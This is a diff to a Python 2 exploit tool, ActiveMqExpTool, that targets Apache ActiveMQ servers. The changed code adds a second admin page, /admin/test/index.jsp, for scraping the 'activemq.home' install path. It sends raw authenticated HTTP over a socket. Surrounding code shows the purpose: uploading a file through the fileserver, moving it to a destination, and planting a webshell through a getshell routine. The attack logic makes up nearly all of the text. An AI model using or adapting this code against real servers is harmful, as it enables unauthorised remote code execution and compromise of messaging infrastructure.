@@ -36,7 +36,7 @@ class ActiveMqExpTool():
         self.put_file_path = "/fileserver/tmp_2016.txt"
         self.local_shell_path = ""
         self.move_shell_path = ""
-        self.get_install_path_url ="/admin/test/systemProperties.jsp"
+        self.get_install_path_url = []
         self.install_path = ""
         self.webshell_path_list = []
 
@@ -109,8 +109,6 @@ Destination:#move_shell_path#
             print e
             sock.close()
 
-    #C:\switch-platform\apache-activemq-5.7.0\bin\win64\..\..
-    #/home/appusr/apache-activemq-5.8.0
     def deal_path(self, install_path):
         real_install_path = ""
         tmppath = install_path
@@ -124,7 +122,7 @@ Destination:#move_shell_path#
             for k in range(0, range_index):
                 real_install_path = real_install_path + "\\"+tmp_list[k]
             real_install_path = real_install_path[1:]
-        print "real_install_path = "+real_install_path
+        # print "real_install_path = "+real_install_path
         return real_install_path
 
     def getshell(self, url, username, password, shell_path):
@@ -162,39 +160,52 @@ Destination:#move_shell_path#
             return
         # 第二步找到路径
         print u"[+]寻找Web应用安装路径"
-        get_install_path_url = self.base_url+self.get_install_path_url
-        try:
-            # print "get_install_path_url = "+get_install_path_url
-            get_install_path_packege = self.check_file_packege.replace("check_url", get_install_path_url).replace("#BASE64#", self.AuthBasic)
-            get_file_sock = self.connectsocket()
-            get_file_sock.sendall(get_install_path_packege)
-            time.sleep(2)
-            # 轮询socket读取数据
-            recv =""
-            while True:
-                time.sleep(0.2)
-                recv_temp = ""
-                try:
-                    recv_temp = get_file_sock.recv(4096)
-                    if recv_temp == "":
-                        break
-                    recv = recv + recv_temp
-                    continue
-                except:
-                    if recv_temp == "":
-                        break
-                    else:
+        self.get_install_path_url.append("/admin/test/systemProperties.jsp")
+        self.get_install_path_url.append("/admin/test/index.jsp")
+        for get_install_path_url in self.get_install_path_url:
+            get_install_path_url = self.base_url + get_install_path_url
+            try:
+                # print "get_install_path_url = "+get_install_path_url
+                get_install_path_packege = self.check_file_packege.replace("check_url", get_install_path_url).replace("#BASE64#", self.AuthBasic)
+                get_file_sock = self.connectsocket()
+                get_file_sock.sendall(get_install_path_packege)
+                time.sleep(2)
+                # 轮询socket读取数据
+                recv =""
+                while True:
+                    time.sleep(0.2)
+                    recv_temp = ""
+                    try:
+                        recv_temp = get_file_sock.recv(4096)
+                        if recv_temp == "":
+                            break
                         recv = recv + recv_temp
                         continue
-            # 换一种寻找办法，使用activemq.home作为安装路径
-            DirIndex = recv.index("activemq.home")
-            endIndex = recv[DirIndex+19:].index("</td>")
-            tempIndex = recv[DirIndex+25:DirIndex+19+endIndex]
-            tempIndex = self.deal_path(tempIndex)
+                    except:
+                        if recv_temp == "":
+                            break
+                        else:
+                            recv = recv + recv_temp
+                            continue
+                #5.10.1遇到的新情况
+                if "System properties" not in recv:
+                    DirIndex = recv.index("activemq.home")
+                    endIndex = recv[DirIndex+19:].index("</td>")
+                    tempIndex = recv[DirIndex+25:DirIndex+19+endIndex]
+                    tempIndex = self.deal_path(tempIndex)
+                    break
+                else:
+                    DirIndex = recv.index("activemq.home")
+                    endIndex = recv[DirIndex+14:].index(",")
+                    tempIndex = recv[DirIndex+14:DirIndex+14+endIndex]
+                    tempIndex = self.deal_path(tempIndex)
+                    break
+            except:
+                continue
+        if tempIndex is None:
+            print u"寻找Web应用路径失败,请联系CF_HB!!!!"
+        else:
             print u"[+]找到安装路径:" + tempIndex
-        except:
-            print u"寻找Web应用路径失败,请手动确认URL: {url}是否存在!!!!".format(url=get_install_path_url)
-            return
         self.install_path = tempIndex
         path_list = self.install_path.split("\\")
         # print "path_list = ",path_list
